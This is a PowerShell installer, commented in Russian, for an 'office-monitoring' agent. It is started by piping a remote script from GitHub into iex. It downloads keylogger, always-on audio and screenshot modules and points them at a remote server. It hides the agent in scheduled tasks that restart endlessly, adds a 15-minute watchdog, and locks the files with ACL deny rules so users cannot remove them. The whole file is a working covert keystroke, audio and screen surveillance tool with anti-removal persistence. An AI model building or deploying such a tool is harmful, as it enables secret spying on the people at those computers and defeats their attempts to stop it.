# office-monitoring agent installer for Windows.
# Запуск (от админа):
#   irm https://raw.githubusercontent.com/dogmat1910-tech/office-monitoring/main/agent/installer.ps1 -UseBasicParsing | iex

$ErrorActionPreference = "Stop"

$ServerUrl   = if ($env:OM_SERVER_URL) { $env:OM_SERVER_URL } else { "https://office.lkdzrkk.pro" }
$InstallDir  = "C:\Program Files\office-monitoring"
$DataDir     = "C:\ProgramData\office-monitoring"
$TaskAgent   = "OfficeMonitoring"
$TaskWatch   = "OfficeMonitoringWatchdog"
$RepoBase    = "https://raw.githubusercontent.com/dogmat1910-tech/office-monitoring/main/agent"
$Files       = @(
    "agent.py", "active_window.py", "audio.py", "always_on_audio.py",
    "categories.py", "idle.py", "keylogger.py", "screenshot.py", "watchdog.py",
    "requirements.txt"
)

function Info($m)  { Write-Host "[*] $m" -ForegroundColor Cyan }
function Ok($m)    { Write-Host "[+] $m" -ForegroundColor Green }
function Warn($m)  { Write-Host "[!] $m" -ForegroundColor Yellow }
function Fail($m)  { Write-Host "[x] $m" -ForegroundColor Red; exit 1 }

# Админ-права обязательны
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Fail "Запусти PowerShell от имени администратора"
}

Info "office-monitoring agent installer"
Info "Сервер: $ServerUrl"
Info "Папка установки: $InstallDir"

# --- Python ---
function Get-PythonExe {
    $candidates = @(
        "C:\Program Files\Python312\python.exe",
        "C:\Program Files\Python311\python.exe",
        "C:\Program Files\Python310\python.exe"
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return $c }
    }
    $cmd = Get-Command python.exe -ErrorAction SilentlyContinue
    if ($cmd -and $cmd.Source -notlike "*WindowsApps*") { return $cmd.Source }
    return $null
}

$python = Get-PythonExe
if (-not $python) {
    Info "Python не найден, ставлю Python 3.12 через winget..."
    & winget install --id Python.Python.3.12 -e --source winget --silent `
        --accept-source-agreements --accept-package-agreements --scope machine
    if ($LASTEXITCODE -ne 0) { Fail "winget install Python завершился ошибкой" }
    Start-Sleep -Seconds 3
    $python = Get-PythonExe
    if (-not $python) { Fail "Python не найден после установки. Перезапусти PowerShell и повтори." }
}
Ok "Python: $python"

# --- Папки ---
Info "Создаю $InstallDir, $DataDir"
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
New-Item -ItemType Directory -Force -Path $DataDir | Out-Null

# --- Файлы агента ---
Info "Скачиваю модули агента..."
foreach ($f in $Files) {
    $dest = Join-Path $InstallDir $f
    Invoke-WebRequest -Uri "$RepoBase/$f" -OutFile $dest -UseBasicParsing
    Ok "  $f"
}

# --- venv + зависимости ---
Info "Создаю venv (--without-pip, ensurepip далее — обход прокси)..."
$venvDir = Join-Path $InstallDir ".venv"
if (Test-Path $venvDir) { Remove-Item -Recurse -Force $venvDir }
& $python -m venv $venvDir --without-pip
if ($LASTEXITCODE -ne 0) { Fail "python -m venv упал" }

$venvPython = Join-Path $venvDir "Scripts\python.exe"
$venvPythonw = Join-Path $venvDir "Scripts\pythonw.exe"
if (-not (Test-Path $venvPython)) { Fail "$venvPython не создан" }

Info "ensurepip..."
& $venvPython -m ensurepip --upgrade
if ($LASTEXITCODE -ne 0) { Fail "ensurepip упал" }

Info "Ставлю зависимости (--proxy='' обход SOCKS)..."
& $venvPython -m pip install --proxy "" --upgrade pip
& $venvPython -m pip install --proxy "" -r (Join-Path $InstallDir "requirements.txt")
if ($LASTEXITCODE -ne 0) { Fail "pip install упал" }
Ok "Зависимости установлены"

# --- Wrapper-скрипты ---
$runAgentBat = Join-Path $InstallDir "run-agent.cmd"
@"
@echo off
setlocal
set OM_SERVER_URL=$ServerUrl
set OM_LOG_DIR=$DataDir
set OM_INSTALL_DIR=$InstallDir
set OM_DATA_DIR=$DataDir
set OM_ENABLE_ALWAYS_ON_AUDIO=1
cd /d "$InstallDir"
start "" "$venvPythonw" "$InstallDir\agent.py"
"@ | Set-Content -Path $runAgentBat -Encoding ASCII

$runWatchBat = Join-Path $InstallDir "run-watchdog.cmd"
@"
@echo off
setlocal
set OM_INSTALL_DIR=$InstallDir
set OM_DATA_DIR=$DataDir
cd /d "$InstallDir"
start "" "$venvPythonw" "$InstallDir\watchdog.py"
"@ | Set-Content -Path $runWatchBat -Encoding ASCII

# --- Scheduled Task: основной агент ---
Info "Регистрирую Scheduled Task '$TaskAgent'..."
schtasks.exe /Delete /TN $TaskAgent /F 2>$null | Out-Null

$action    = New-ScheduledTaskAction -Execute $runAgentBat
$trigger   = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                -ExecutionTimeLimit (New-TimeSpan -Days 0) `
                -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) `
                -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $TaskAgent -Action $action -Trigger $trigger `
    -Principal $principal -Settings $settings -Force | Out-Null
Ok "Scheduled Task '$TaskAgent' создан"

# --- Scheduled Task: watchdog (с триггерами At-LogOn + раз в 15 мин) ---
Info "Регистрирую Scheduled Task '$TaskWatch'..."
schtasks.exe /Delete /TN $TaskWatch /F 2>$null | Out-Null

$actionW    = New-ScheduledTaskAction -Execute $runWatchBat
$triggerW1  = New-ScheduledTaskTrigger -AtLogOn
# Триггер раз в 15 минут — на случай если убили оба процесса
$triggerW2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(15) `
                -RepetitionInterval (New-TimeSpan -Minutes 15) `
                -RepetitionDuration (New-TimeSpan -Days 365)
Register-ScheduledTask -TaskName $TaskWatch -Action $actionW -Trigger @($triggerW1, $triggerW2) `
    -Principal $principal -Settings $settings -Force | Out-Null
Ok "Scheduled Task '$TaskWatch' создан"

# --- ACL: только админ может удалить/изменить ---
Info "Защищаю папку через ACL..."
# Сбрасываем наследование, даём Admin/SYSTEM полный, Users только Read+Execute
& icacls.exe $InstallDir /inheritance:r `
    /grant:r "Administrators:(OI)(CI)F" `
    /grant:r "SYSTEM:(OI)(CI)F" `
    /grant:r "Users:(OI)(CI)RX" /T | Out-Null
# Дополнительно: явный deny Delete/Modify для обычных пользователей
& icacls.exe $InstallDir /deny "Users:(DE,DC,WDAC,WO)" /T 2>$null | Out-Null
Ok "ACL обновлён"

# DataDir — лог должен быть доступен на запись от пользователя (он его пишет)
& icacls.exe $DataDir /inheritance:r `
    /grant:r "Administrators:(OI)(CI)F" `
    /grant:r "SYSTEM:(OI)(CI)F" `
    /grant:r "Users:(OI)(CI)RX(WD,AD)" /T | Out-Null
# но удалить файлы — нельзя
& icacls.exe $DataDir /deny "Users:(DE,DC)" /T 2>$null | Out-Null

# --- Запускаем ---
Info "Запускаю агент и watchdog..."
Start-ScheduledTask -TaskName $TaskAgent
Start-ScheduledTask -TaskName $TaskWatch
Start-Sleep -Seconds 3

$tA = Get-ScheduledTask -TaskName $TaskAgent | Get-ScheduledTaskInfo
$tW = Get-ScheduledTask -TaskName $TaskWatch | Get-ScheduledTaskInfo
Ok "Agent task: $($tA.LastTaskResult), Watchdog task: $($tW.LastTaskResult)"

Write-Host ""
Ok "========================================"
Ok "Установка завершена"
Ok "========================================"
Write-Host ""
Write-Host "Сервер:    $ServerUrl"
Write-Host "Лог:       $DataDir\agent.log"
Write-Host "Watchdog:  $DataDir\watchdog.log"
Write-Host ""
Write-Host "Команды (от админа):"
Write-Host "  Get-ScheduledTask -TaskName $TaskAgent,$TaskWatch | Get-ScheduledTaskInfo"
Write-Host "  Get-Content '$DataDir\agent.log' -Tail 20 -Wait"
Write-Host ""
Write-Host "Деинсталляция:"
Write-Host "  irm $RepoBase/uninstall.ps1 -UseBasicParsing | iex"
